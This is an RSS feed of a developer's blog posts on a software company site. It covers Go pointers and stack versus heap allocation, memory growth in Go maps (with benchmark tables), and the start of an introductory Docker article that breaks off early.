<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Rezwanul Haque &#8211; Vivasoft</title>
	<atom:link href="/author/rezwan/feed/" rel="self" type="application/rss+xml" />
	<link>/</link>
	<description>Top Software Company with Talented Geeks</description>
	<lastBuildDate>Wed, 26 Oct 2022 23:10:14 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.1</generator>

<image>
	<url>/wp-content/uploads/2021/08/cropped-feb-icon-32x32.png</url>
	<title>Rezwanul Haque &#8211; Vivasoft</title>
	<link>/</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>Go Pointers &#8211; Immutability Vs Efficiency</title>
		<link>/blog/go-pointers-immutability-vs-efficiency/</link>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Tue, 25 Oct 2022 17:06:46 +0000</pubDate>
				<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[Efficiency]]></category>
		<category><![CDATA[golang]]></category>
		<category><![CDATA[Immutability]]></category>
		<category><![CDATA[Pointers]]></category>
		<category><![CDATA[vs]]></category>
		<guid isPermaLink="false">/?p=12334</guid>

					<description><![CDATA[Pointers are a fundamental and necessary aspect of Golang. They allow us to manipulate memory and data structures from a simple level, without needing to know the specifics of some more abstract data structures. This article will cover Go pointers, their use in stacks and heaps, immutability vs efficiency as well as pointer types (primitives [&#8230;]]]></description>
										<content:encoded><![CDATA[<p class="maps-to-line">Pointers are a fundamental and necessary aspect of Golang. They allow us to manipulate memory and data structures from a simple level, without needing to know the specifics of some more abstract data structures.</p>
<p class="maps-to-line">This article will cover Go pointers, their use in stacks and heaps, immutability vs efficiency as well as pointer types (primitives and variables).</p>
<p class="maps-to-line">Everybody uses pointers occasionally. How well-versed are we in it? What is taking place behind the scenes? In this post, we&#8217;ll talk about pointers and how they might improve program performance at the expense of flexibility.<br />
Anyone who reads this will be able to explain how pointers relate to any of this, as well as what happens when a function calls and the distinction between heap and stack allocations.</p>
<p class="maps-to-line">Let&#8217;s define a variable in Golang, you can relate to any programming in general.<br />
Let&#8217;s understand what is a variable first. So a variable is a container for storing a value. we can think of it as a box that has 3 things</p>
<ul>
<li class="maps-to-line">a name</li>
<li class="maps-to-line">a type</li>
<li class="maps-to-line">a value</li>
</ul>
<p><img decoding="async" class="wp-image-12336 aligncenter" src="/wp-content/uploads/2022/10/variable_explain.gif" alt="Go Pointers - Immutability Vs Efficiency" width="421" height="421"></p>
<h2 id="it-will-store-somewhere-in-the-memory" class="maps-to-line">It will store somewhere in the memory.</h2>
<p class="maps-to-line"><img decoding="async" class="wp-image-12337 aligncenter" src="/wp-content/uploads/2022/10/somewhere_in_the_memory.gif" alt="somewhere_in_the_memory" width="494" height="278" /></p>
<p class="maps-to-line">It resembles putting a box in a warehouse in many ways. The value is in the box. We gave that box a name and a type as well. We added an address to that box as well. The location of the box inside the warehouse will be indicated by this address. Therefore, if we know the address, we can quickly locate and retrieve the box if we need it.</p>
<p class="maps-to-line">Let&#8217;s see this in Golang</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main() {
    var foo, bar int = 23, 42
    
    fmt.Println(foo, bar) // will print the value
    fmt.Println(&amp;foo, &amp;bar) // will print the address
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">Easy, right? In the first line we are defining 2 variables foo, bar with the value of 23, and 42 of type int. in lines 3 &amp; 4 we print the values and it&#8217;s addressed in the console.</p>
<blockquote class="maps-to-line"><p>Quick Note: <code class="inline-code">&amp;</code> can be read as <code class="inline-code">address of</code>.<br />
Every new variable has been given an address, and with that, we can locate that in the memory. This address will be the value of the pointer if we assign it to a pointer like below</p></blockquote>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main() {
    var foo, bar int = 23, 42
    p := &amp;foo
    q := &amp;bar
    
    fmt.Println(p, q) // will print the address of foo, bar
    // 0xc00001c0a8 0xc00001c0b0
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">p &amp; q will hold the address of the foo &amp; bar variable. Here we&#8217;re using the short-hand variable declaration feature of Golang.</p>
<p class="maps-to-line"><img decoding="async" class="wp-image-12338 aligncenter" src="/wp-content/uploads/2022/10/foo2p-address.gif" alt="foo_2_pointer_address" width="533" height="533" /></p>
<p class="maps-to-line">In the above picture, we can see how <code class="inline-code">p</code> is holding the address of <code class="inline-code">foo</code>.</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main() {
    var foo int = 23
    p := &amp;foo
    
    fmt.Println(*p) 
    // any guess
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line"><code class="inline-code">*p</code> will print the value stored in that address which is the foo value <code class="inline-code">23</code> we define above.</p>
<p class="maps-to-line">Here <code class="inline-code">*</code> can be a little confusing at first as it can be used in two ways.</p>
<ul>
<li class="maps-to-line">Before a type (<code class="inline-code">*int</code>)</li>
<li class="maps-to-line">Before a variable (<code class="inline-code">*p</code>)</li>
</ul>
<h4 id="before-a-type" class="maps-to-line">Before a type</h4>
<p class="maps-to-line"><code class="inline-code">*int</code> the whole thing becomes a type. It is <code class="inline-code">pointer type</code> and the <code class="inline-code">int</code> as its base.</p>
<h4 id="before-a-variable" class="maps-to-line">Before a variable</h4>
<p class="maps-to-line"><code class="inline-code">*p</code> means when it is before a variable, it acts as an operator which returns the value the p is pointing to. That&#8217;s why when we print <code class="inline-code">*p</code> it&#8217;ll print <code class="inline-code">23</code> because it&#8217;s the value of the variable <code class="inline-code">p</code> is pointing to. It&#8217;s also called <code class="inline-code">Dereferencing</code>. So we can say that the value of <code class="inline-code">p</code> is the address of <code class="inline-code">foo</code> and <code class="inline-code">*p</code> is the value at that address which is the value of <code class="inline-code">foo</code>.<br />
So what if we want to change the value of *p what will happen then. Any guess&#8230;</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main() {
    var foo int = 23
    p := &amp;foo
    fmt.Println(*p) // 23
    *p = 42
    fmt.Println(*p)
    // any guess
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">Yes, it&#8217;ll be <code class="inline-code">42</code>.</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main() {
    var foo, bar int = 23, 3600
    p := &amp;foo
    fmt.Println(*p) // 23
    p = &amp;bar
    *p = *p / 36
    fmt.Println(bar)
    // any guess
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">Any guess what will happen to the value of <code class="inline-code">bar</code> variable?</p>
<blockquote class="maps-to-line"><p>Quick note: We can put <code class="inline-code">bar</code> in <code class="inline-code">*p</code> because p&#8217;s type is a pointer and the base type is int, if it&#8217;s not int then it&#8217;ll return a run time error.</p></blockquote>
<p class="maps-to-line">As we&#8217;re doing an operation on <code class="inline-code">*p</code> so the value of the bar will be modified. So the value will be printed 100.<br />
So why do we need pointers anyway?<br />
Good question, right? If we just want to modify <code class="inline-code">bar</code>s value then we can just modify <code class="inline-code">bar</code> right? Then why??<br />
Well, It&#8217;s efficient to store a value in one place and access it from multiple places.<br />
Let&#8217;s understand with an example<br />
Suppose we have four different functions and all the functions want to access <code class="inline-code">bar</code> and want to modify it. So <code class="inline-code">bar</code> will be modified in multiple places. This way of accessing a variable from multiple places using pointers is more efficient than creating a local copy of the variable without using a pointer.<br />
To understand the situation more clearly, we need to understand <code class="inline-code">Memory Allocations</code> first. Let&#8217;s understand that first&#8230;</p>
<h2 id="memory-allocations" class="maps-to-line">Memory Allocations</h2>
<p class="maps-to-line">When we try to run a program, a goroutine is created and each goroutine gets a stack of memory.</p>
<p class="maps-to-line"><img decoding="async" class="wp-image-12339 aligncenter" src="/wp-content/uploads/2022/10/stack_of_memory.gif" alt="stack_of_memory" width="622" height="350" /></p>
<p class="maps-to-line">You may ask what is a goroutine&#8230;</p>
<blockquote class="maps-to-line">
<h3 id="what-is-a-goroutine">What is a goroutine?</h3>
<p>a <code class="inline-code">goroutine</code> is an independent path of execution. we can also think of it as a very lightweight thread that is managed by go runtime.</p></blockquote>
<p class="maps-to-line">Let&#8217;s go back to the topic. Whenever a goroutine makes a function call, a part of the stack is going to be allocated we call that <code class="inline-code">frame</code>. Let&#8217;s see this in an example for a better understand</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main() {
    a := 6
    AddN(a)
}
// AddN will add n to the result and print its address and value 
func AddN(n int) {
    r := 0
    r += n
    fmt.Println(&amp;r, r)
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">Here we define two functions <code class="inline-code">main</code> &amp; <code class="inline-code">AddN</code>, when we run the main function we get a frame on the stack. The current running frame is called the <code class="inline-code">Active Frame</code>.</p>
<p class="maps-to-line"><img decoding="async" class="wp-image-12340 aligncenter" src="/wp-content/uploads/2022/10/active_frame_stack.gif" alt="active_frame_stack" width="622" height="350" /></p>
<p class="maps-to-line">So, After running the main function, we then call &#8220;AddN&#8221; as we follow through the main function. The stack will allocate another frame as soon as we call &#8220;AddN,&#8221; and the goroutine will only operate within that new frame. It cannot go to other frames, stacks, or anything else. This is advantageous because, if we isolate each frame, we guarantee immutability, which implies that there is less chance that the variables will be changed during the program. So here the common question arises how can we access the <code class="inline-code">a</code> variable inside the active frame? So the straight forward answer would be we can&#8217;t access it. instead, we have to copy the value of <code class="inline-code">a</code> into the new active frame and inside the active frame that value is going to be called <code class="inline-code">n</code> and we can modify <code class="inline-code">n</code> add it then print it, and do whatever we want with it but because we&#8217;re making the changes inside the active frame it will not change anything else in the program outside of this frame. So the mutation will only happen inside this isolated frame.</p>
<p class="maps-to-line">Can anyone guess what&#8217;s the catch here? Because we need to copy the arguments each time we make a function call which is not going to be so efficient. So when the <code class="inline-code">AddN</code> function call ends and the active frame goes back to the main function <code class="inline-code">a</code> will still be 6 but what if we want to change <code class="inline-code">a</code> itself in the main function we want to get our hands on <code class="inline-code">a</code> and not just the copy of it well this is where we start talking about pointers.</p>
<p class="maps-to-line">Let&#8217;s write a new function using pointers so that it can modify the variable <code class="inline-code">a</code> in the main function from the function by saying go and changing the value at that specific address.</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main() {
    a := 6
    squareAdd(&amp;a)
}
// AddN will add n to the result and print its address and value 
func squareAdd(p *int) {
    *p *= *p
    fmt.Println(p, *p)
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">We&#8217;re inputting an address instead of a normal integer so we&#8217;re going to put this address as the input parameter and we&#8217;re calling it <code class="inline-code">p</code> so the type of the input is <code class="inline-code">*int(star int)</code>. The star here is not a dereferencing operator as we discuss above. Star int itself is just one whole token. We want to square the value of what&#8217;s at that address so we need to put a star in front of p if we want to say the value at p which in this example is going to be <code class="inline-code">a</code> and then let&#8217;s print out p which is an address and the value of what p is pointing to by saying star p(<code class="inline-code">*p</code>).</p>
<p class="maps-to-line">So when we call this function we need to pass in an address, not a value what you need to pass is an ampersand(&amp;) <code class="inline-code">a</code> because <code class="inline-code">&amp;</code> means that you&#8217;re passing in the address of <code class="inline-code">a</code>.</p>
<p class="maps-to-line">Let&#8217;s see what happens in the stack when we call <code class="inline-code">squareAdd</code> function. Instead of copying <code class="inline-code">a</code> we are copying the address of <code class="inline-code">a</code> and assigning it as a pointer <code class="inline-code">p</code> in the frame and that pointer is pointing across the boundary of the frame and this is how we can modify the value of <code class="inline-code">a</code> in the currently active frame by using <code class="inline-code">*p</code>.</p>
<p class="maps-to-line">After we finish calling the functions we move to the main function again and everything under the active frame then becomes invalid meaning that if we make another function call this space will be overwritten and go will set all the variables to a zero value for the new frame so that we won&#8217;t accidentally be using any random garbage values.</p>
<p class="maps-to-line">We&#8217;ll explain <code class="inline-code">Garbage collector</code> in detail in a future post. Stay tuned for that. Now let&#8217;s continue&#8230;</p>
<p class="maps-to-line">When we&#8217;re using value semantics like the example above with <code class="inline-code">AddN</code> it was fine there&#8217;s no way <code class="inline-code">a</code> can get mutated but when we using pointer semantics we need to be careful because there is more possibility for the variable to be mutated in a way we didn&#8217;t intend.</p>
<p class="maps-to-line">When we use pointer semantics you&#8217;re giving up the safety of immutability for more efficiency. Now that we understand how pointers work in functions and we also learned about how they can affect variables in the stack. Now final topic we need to understand is Heaps. Let&#8217;s talk about it.</p>
<h2 id="heaps" class="maps-to-line">Heaps</h2>
<p class="maps-to-line">To understand the Heaps which is not the data structure we know from CS 101, but it&#8217;s a separate structure altogether. We need to understand that heaps need to be cleaned by the garbage collection where the stack is self-cleaning. To understand the difference between heap and stack, we need to compare the difference between returning a value and returning a pointer. Let&#8217;s define an example to understand more clearly&#8230;</p>
<h4 id="return-value" class="maps-to-line">Return value</h4>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

type person struct {S
    name string
    age uint
}

func NewPerson() person {
    p := person{
        name: "dummy person"
        age: 60
    }
    fmt.Println("new person --&gt; ", p)
    return p
}

func main() {
    fmt.Println("main --&gt; ", NewPerson())
}</pre>
<p>&nbsp;</p>
</div>
<h4 id="return-pointer" class="maps-to-line">Return Pointer</h4>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

type person struct {S
    name string
    age uint
}

func NewPerson() *person {
    p := person{
        name: "dummy person"
        age: 60
    }
    fmt.Println("new person --&gt; ", &amp;p)
    return &amp;p
}

func main() {
    fmt.Println("main --&gt; ", NewPerson())
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">So the two code block above has almost identical code with one exception where 1st code block returns a value from<code class="inline-code"> NewPerson</code> function and 2nd code returns a pointer from <code class="inline-code">NewPerson</code> function.</p>
<p class="maps-to-line">The <code class="inline-code">NewPerson</code> initializes the person struct with dummy values and then returns it. After that, we call the <code class="inline-code">NewPerson</code> function from the main function and print the result.</p>
<p class="maps-to-line">What happening behind the scene is, Go runtime assign the main function as an active frame in the stack of memory. Then when we call the <code class="inline-code">NewPerson</code>, a new frame is created in the stack of memory and allocates <code class="inline-code">p</code>, and then changes the values in p. Because of the isolation of the <code class="inline-code">NewPerson</code> frame, we can not send <code class="inline-code">p</code> to the main function instead we will be making a copy of it and pass to the main active frame so that&#8217;s what happens when we return a value.</p>
<p class="maps-to-line">But instead of returning a value, let&#8217;s return the address of <code class="inline-code">p</code> which we showed in the above example. The point to be noted here is the function still works the same way as before but instead of copying the value this function going to make a copy of the address of <code class="inline-code">p</code> to the main function frame, we can notice something important here at the same time something weird as the <code class="inline-code">NewPerson</code> finishes executing here the <code class="inline-code">New Person</code> active frame is going to become invalid so the address we copied into the active frame is going to be useless we don&#8217;t know what that going to point to in the memory. So that can be a huge problem if we can&#8217;t resolve the address and this is where <code class="inline-code">heaps</code> going to help us solve the problem.</p>
<blockquote class="maps-to-line"><p>Note <code class="inline-code">Heaps</code> is not the same as the data structure we study in cs 101 data structures, they share the same name but completely different things.</p></blockquote>
<p class="maps-to-line">So the compiler will analyze that and conclude that there&#8217;s going to be a problem so it&#8217;s going to copy m to the <code class="inline-code">heap</code> then the <code class="inline-code">NewPerson</code> function will return the address of <code class="inline-code">p</code> in the heap and after return when the address of <code class="inline-code">p</code> is copied to the frame of the main function. So now we can access <code class="inline-code">p</code> with that address.</p>
<p class="maps-to-line">In the above, we print the address of the <code class="inline-code">p</code> to check if they share the same address from <code class="inline-code">NewPerson</code> function and the main function. So our problem is solved but we&#8217;re doing this in the cost of heap allocations which can be a burden for the garbage collector and it can cost us performance.</p>
<p>If you like, you can read the same article on my <a href="https://rezwanul-haque.hashnode.dev/go-pointers" rel="nofollow noopener" target="_blank">[Personal blog]</a></p>
<blockquote>
<h4> You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></h4>
</blockquote>
<h2 id="conclusion" class="maps-to-line">Conclusion</h2>
<p class="maps-to-line">Go pointers can be a great way to implement efficiency in the codebase. But in doing so we have to think about the garbage collector as we assign more work for it as it needs to clean the heap allocations instead if we want Immutability in the codebase so that it uses a stack of memory which will automatically clean the stack when the frame finished its work and it just discards the frame and everything inside that frame when another function is called this space will be used by another frame. So we need to understand the stack and heaps because if we put too many things on the heap then the Garbage Collector needs to free more things from the heap as we don&#8217;t use those things anymore. In contrast, it can affect performance.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Golang Mistakes: #1 Maps and Memory Leaks</title>
		<link>/blog/golang-mistakes-1-maps-and-memory-leaks/</link>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Thu, 20 Oct 2022 17:11:41 +0000</pubDate>
				<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[errors]]></category>
		<category><![CDATA[golang]]></category>
		<category><![CDATA[maps]]></category>
		<category><![CDATA[memory]]></category>
		<category><![CDATA[mistakes]]></category>
		<guid isPermaLink="false">/?p=12205</guid>

					<description><![CDATA[When it comes to software development we always want to ensure our code never uses excessive memory when a function finishes its work. That&#8217;s why some of the language features like garbage collection (GC) were implemented so that memory leaks do not occur. Also as a beginner software engineer, who just learning to code in [&#8230;]]]></description>
										<content:encoded><![CDATA[<p class="maps-to-line">When it comes to software development we always want to ensure our code never uses excessive memory when a function finishes its work. That&#8217;s why some of the language features like garbage collection (GC) were implemented so that memory leaks do not occur. Also as a beginner software engineer, who just learning to code in Golang uses built-in maps data structure for faster access to data. Sometimes even seniors may miss the drawbacks of excessively using those data structures without thinking. Sometimes those data structures may lead to memory leaks in the code base. Today we&#8217;re going to talk about the cons of the map&#8217;s data structure if anyone without thinking uses it excessively it may lead to a memory leak.</p>
<blockquote class="maps-to-line"><p>The post is taken from a book called <code class="inline-code">100 Go Mistakes and How to Avoid Them</code> If anyone wants to learn more about this mistake and others please read the book. I learned a lot from the book.</p></blockquote>
<p class="maps-to-line">A map is a powerful, ingenious, and versatile data structure. Golang Maps is a collection of unordered pairs of key-value. It is widely used because it provides fast lookups and values that can retrieve, updated, or delete with the help of keys.</p>
<p class="maps-to-line">Let&#8217;s create a simple map in Golang</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
 
import "fmt"
 
func main() {
    // Creating and initializing empty ma using `var` keyword
    var nilMapContainer map[int]int
 
    // Checking if the map is nil or not
    if nilMapContainer == nil {
        fmt.Println("True")
    } else {
        fmt.Println("False")
    }
    
    // Note: `nilMapContainer` will throw panic if we try to assign value to an uninitialized key
    
    // Using shorthand declaration
    animes := map[int]string{
            1: "One Piece",
            2: "Naruto",
            3: "Link Click",
            4: "Death Parade",
            5: "Tomodachi Game",
    }
     
    fmt.Println("animes ", animes)
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">Also, this data structure references a hash table. So data lookups from this table are fast using the key.</p>
<h2 id="but" class="maps-to-line">But</h2>
<p class="maps-to-line">There&#8217;s a huge drawback if we use a map without thinking. So let&#8217;s talk about that&#8230;</p>
<p class="maps-to-line">In memory, If we put a new key value in a Map it takes some memory space. Interestingly this memory space never shrinks in size, it always grows in the memory as a result. Because of this, it may lead to memory problems.</p>
<p class="maps-to-line">When working with the map data structure in Golang, we need to know some of the important characteristics of this data structure, how it grows and how much it shrinks.</p>
<p class="maps-to-line">Although, It&#8217;s proposed that in the future version of Go, the map implementation will be changed so that it can shrink too. Anyone can check the issue on <a title="https://github.com/golang/go/issues/54766" href="https://github.com/golang/go/issues/54766" data-from-md="" rel="nofollow noopener" target="_blank">Github</a>.</p>
<p class="maps-to-line">Let’s deep dive into this to prevent issues that can cause memory leaks.</p>
<p class="maps-to-line">First, to view a concrete example of this problem, let’s design a scenario where we will work with the following map:</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">m := make(map[int][128]byte)</pre>
</div>
<p class="maps-to-line">Each value of <code class="inline-code">m</code> is an array of 128 bytes. We will do the following:</p>
<ol>
<li class="maps-to-line">Allocate an empty map.</li>
<li class="maps-to-line">Add 1 million elements.</li>
<li class="maps-to-line">Remove all the elements, and run a Garbage Collection (GC).</li>
</ol>
<p class="maps-to-line">After each step, we want to print the size of the heap (using a <code class="inline-code">printAllocatedMemory</code> utility function). This shows us how this example behaves in memory:</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import (
    "fmt"
    "runtime"
)

func main() {
    n := 1_000_000
    m := make(map[int][128]byte)
    printAllocatedMemory()

    for i := 0; i &lt; n; i++ { // Adds 1 million elements
        m[i] = [128]byte{}
    }
    printAllocatedMemory()

    for i := 0; i &lt; n; i++ { // Deletes 1 million elements
        delete(m, i)
    }

    runtime.GC() // Triggers a manual GC
    printAllocatedMemory()
    runtime.KeepAlive(m) // Keeps a reference to m so that the map isn’t collected
}

func printAllocatedMemory() {
    var m runtime.MemStats
    runtime.ReadMemStats(&amp;m)
    fmt.Printf("%d MB\n", (m.Alloc/1024)/1024)
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">We allocate an empty map, add 1 million elements, remove 1 million elements, and then run a GC. We also make sure to keep a reference to the map using <code class="inline-code">runtime.KeepAlive</code> so that the map isn’t collected by the GC and removed it. In simple terms, <code class="inline-code">KeepAlive</code> will not be collected by the Garbage Collector when all the key-value is removed from the variable <code class="inline-code">m</code>. Let’s run this example:</p>
<table class="maps-to-line">
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Steps</td>
<td>Memory</td>
</tr>
<tr>
<td>After m is allocated</td>
<td>0 MB</td>
</tr>
<tr>
<td>After we add 1 million elements</td>
<td>461 MB</td>
</tr>
<tr>
<td>After we remove 1 million elements</td>
<td>293 MB</td>
</tr>
</tbody>
</table>
<p class="maps-to-line">After observing the result above, we can say that the heap size is initially very small. Once 1 million additional elements have been added to the map, it then expands dramatically. But if we had anticipated that the heap size would shrink after eliminating all the values, Which is not the case here, because Go maps don&#8217;t operate in this way. In the end, the heap size is still 293 MB even if the GC has collected all of the components. Although we say it doesn&#8217;t shrink at the beginning of the post which is not true, right? but in the end, even though the GC has collected all the elements, the heap size is still 293 MB. The memory shrank as a result, but not in the way we might have anticipated. Why is this happening, exactly? We must thoroughly examine how Go&#8217;s map data structure operates.</p>
<p class="maps-to-line">A map offers an unordered collection of key-value pairs where each key is unique. A map in Go is based on the hash table data structure, which is an array whose elements each point to a collection of key-value pairs. As shown in figure 1.</p>
<p><img decoding="async" class="alignnone size-full wp-image-12207" src="/wp-content/uploads/2022/10/hash_table_in_golang.gif" alt="hash table in golang Golang Mistakes: #1 Maps and Memory Leaks" width="800" height="450"></p>
<p class="maps-to-line" style="text-align: center"><span style="font-family: 'Courier New', monospace">Figure 1 &#8211; Hash Table In Golang</span></p>
<p class="maps-to-line">In Golang, The bucket size is fixed and the max limit is eight elements per bucket. So in case of inserting a new element into an overflowed bucket, Go assign a new bucket for the new element and links the new bucket to the previous one. Figure 2 shows an example:</p>
<p class="maps-to-line"><img decoding="async" class="alignnone size-full wp-image-12206" src="/wp-content/uploads/2022/10/bucket_overflow_in_golang_v3.gif" alt="bucket overflow in golang v3 Golang Mistakes: #1 Maps and Memory Leaks" width="800" height="450"><code></code></p>
<p style="text-align: center">Figure 2 &#8211; Bucket overflow, link new bucket to previous one.</p>
<p class="maps-to-line">Behind the scene, a Go map is a pointer to a <code class="inline-code">runtime.hmap</code> struct. This struct contains multiple fields which including a <code class="inline-code">B</code> field, <code class="inline-code">B</code> represents the number of buckets in a map:</p>
<p class="maps-to-line">After adding 1 million elements to the map, the value of <code class="inline-code">B</code> which corresponds to the bucket is 18, which means 2¹⁸ = 262,144 buckets assign to the map. But when we remove the 1 million elements from the map, what happen to the number of buckets? As the number of the bucket in a map cannot shrink therefore removing elements from the map doesn&#8217;t reduce the number of buckets. it just zeros the slots in the buckets.</p>
<p class="maps-to-line">In our example, we went from 461 MB to 293 MB because the elements were collected by the garbage collector, but running the GC didn’t impact the map itself. Even the number of extra buckets (the buckets created because of overflows) remains the same.</p>
<p class="maps-to-line">Let’s take a step back and discuss when the fact that a map cannot shrink can be a problem. Imagine building a cache using a <code class="inline-code">map[int][128]byte</code>. This map holds per customer ID (the int), a sequence of 128 bytes. Now, suppose we want to save the last 1,000 customers. The map size will remain constant, so we shouldn’t worry about the fact that a map cannot shrink.</p>
<p class="maps-to-line">However, let’s say we want to store one hour of data. Meanwhile, our company has decided to have a big promotion for the Eid festival: in one hour, we may have millions of customers connected to our system. But a few days after the Eid festival, our map will contain the same number of buckets as during the peak time. This explains why we can experience high memory consumption that doesn’t significantly decrease in such a scenario. This is a big problem, right? So we want to clean this amount of memory without manually restarting our service, right?</p>
<h2 id="solution" class="maps-to-line">Solution</h2>
<h3 id="1" class="maps-to-line">#1</h3>
<p class="maps-to-line">We can make copies of the current map at regular intervals. We could create a new map, clone all the components, and release it every hour, as an example. The biggest disadvantage of this method is that for a little period after the copy and up to the subsequent garbage collection, we might need twice as much RAM as we do right now.</p>
<h3 id="2" class="maps-to-line">#2</h3>
<p class="maps-to-line">We may also alter the map type to <code class="inline-code">map[int]*[128]byte</code> to hold an array pointer. Although it doesn&#8217;t address the issue of how many buckets we will have, each bucket entry will reserve a pointer size for the item rather than 128 bytes (8 bytes on 64-bit systems and 4 bytes on 32-bit systems).</p>
<p class="maps-to-line">Let&#8217;s compare the memory usage for each map type after each step, going back to the initial scenario. The comparison is presented in the following table.</p>
<table class="maps-to-line">
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Steps</td>
<td><code class="inline-code">map[int][128]byte</code></td>
<td><code class="inline-code">map[int]*[128]byte</code></td>
</tr>
<tr>
<td>Allocate an empty map</td>
<td>0 MB</td>
<td>0 MB</td>
</tr>
<tr>
<td>Add 1 million elements</td>
<td>461 MB</td>
<td>182 MB</td>
</tr>
<tr>
<td>Remove all the elements and run a GC</td>
<td>293 MB</td>
<td>38 MB</td>
</tr>
</tbody>
</table>
<p class="maps-to-line">As we can see, a <code class="inline-code">map[int]*[128]byte</code> type requires substantially less memory after all the elements have been removed. Additionally, because of several optimizations to lower memory consumption, the amount of RAM required in this scenario is less significant during peak times.</p>
<blockquote class="maps-to-line"><p>NOTE: If a key or a value is over 128 bytes, Go won’t store it directly in the map bucket. Instead, Go stores a pointer to reference the key or the value.</p></blockquote>
<p>If you like, you can read the same article on my <a href="https://rezwanul-haque.hashnode.dev/golang-mistakes-1-maps-and-memory-leaks" rel="nofollow noopener" target="_blank">[ Personal blog]</a></p>
<blockquote>
<h4>You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></h4>
</blockquote>
<h2 id="conclusion" class="maps-to-line">Conclusion</h2>
<p class="maps-to-line">We can say, Go never removes the buckets from memory even after removing all the elements from the map. So we need to be careful when using a map as it only grows in memory as a result. To reduce the high memory consumption, we need to use different techniques like re-create the map forcefully or using pointers so that memory consumption can be optimized.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>What is Docker</title>
		<link>/blog/what-is-docker/</link>
					<comments>/blog/what-is-docker/#respond</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Fri, 12 Aug 2022 12:04:02 +0000</pubDate>
				<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[Personal]]></category>
		<category><![CDATA[Technology]]></category>
		<category><![CDATA[container]]></category>
		<category><![CDATA[devops]]></category>
		<category><![CDATA[docker]]></category>
		<category><![CDATA[image]]></category>
		<guid isPermaLink="false">/?p=10018</guid>

					<description><![CDATA[Docker is an open-source, container technology that allows developers and sysadmins to package applications so that they can be easily moved from one environment to another. This includes their dependencies, libraries, the code itself, and more. Docker&#8217;s use cases are limitless. It can be used as a way to deploy web applications, set up development [&#8230;]]]></description>
										<content:encoded><![CDATA[<p class="maps-to-line">Docker is an open-source, container technology that allows developers and sysadmins to package applications so that they can be easily moved from one environment to another. This includes their dependencies, libraries, the code itself, and more.</p>
<p class="maps-to-line">Docker&#8217;s use cases are limitless. It can be used as a way to deploy web applications, set up development environments, or build libraries of pre-tested components in a reliable and repeatable fashion.</p>
<p class="maps-to-line">As software engineers, We are assigned a task that solves a specific client-related business problem in the IT world. As we try to solve that specific problem, we always use specific tools and technology that will solve that problem efficiently and as quickly as possible. As our software team grows and also each one of us like different OS(Operating System) preferences like someone like MacOS, others like Linux, Many of us like Windows, etc. Now when a new member joins our team, we provide him with a Personal Computer(PC) which he will use to work on. Another member of the team will provide him with the latest project repository so that he can easily set up the project on his new pc to work on. Most of the target focuses on a new team member, and how quickly he/she can contribute to that project. To do so the project should take a minimal amount of time to set up so our new members can start contributing to the project. This same problem occurs when we try to deploy our project solution to the dev, staging, or production server.</p>
<p class="maps-to-line">You may say, what the hell? What that story above mentioned, relates to <strong>Docker</strong>. Let&#8217;s first go through the official definition of docker then we will explain it in simple terms</p>
<blockquote class="maps-to-line"><p>What is Docker? What problem is it trying to solve?</p></blockquote>
<p class="maps-to-line">Also, let&#8217;s try to relate how the above story relates to Docker.</p>
<h2 id="official-definition" class="maps-to-line">Official Definition</h2>
